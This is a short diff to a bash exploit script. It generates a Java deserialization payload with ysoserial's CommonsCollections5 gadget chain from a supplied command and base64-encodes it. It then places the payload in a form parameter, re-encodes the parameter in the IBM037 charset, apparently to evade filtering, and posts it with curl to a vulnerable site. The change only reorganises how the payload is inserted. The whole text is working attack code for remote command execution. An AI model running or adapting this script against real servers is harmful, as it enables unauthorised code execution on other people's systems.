@@ -50,8 +50,10 @@ function param_processor {
 
 charset=ibm037
 processors=(urldecode "enc '${charset^^}'" urlencode)
-static_data='param1=v%61l%201&state='
-payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
-data=$(printf "%s" "${static_data}${payload}"|param_processor processors)
+params='param1=v%61l%201&state=%PAYLOAD%'
 
-curl -i -s -k -H "Content-Type: application/x-www-form-urlencoded; charset=${charset,,}" -d "$data" 'https://vuln_site'
+payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
+params=${params/"%PAYLOAD%"/${payload}}
+params_processed=$(printf "%s" "${params}"|param_processor processors)
+
+curl -i -s -k -H "Content-Type: application/x-www-form-urlencoded; charset=${charset,,}" -d "$params_processed" 'https://vuln_site'
